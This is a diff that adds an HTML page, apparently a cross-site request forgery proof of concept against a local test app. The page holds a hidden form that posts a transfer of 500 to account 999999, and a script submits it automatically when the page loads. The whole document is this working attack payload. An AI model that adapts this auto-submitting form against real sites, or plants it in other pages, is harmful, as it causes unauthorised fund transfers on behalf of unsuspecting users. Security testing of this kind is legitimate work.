@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <form id="CSRF_TEST" action="http://localhost:15000/transfer" method="POST">
+        <input type="hidden" name="to" value="999999"> 
+        <input type="hidden" name="transferAmount" value="500">
+    </form>
+    <script>
+        document.getElementById('CSRF_TEST').submit();
+    </script>
+</body>
+</html>
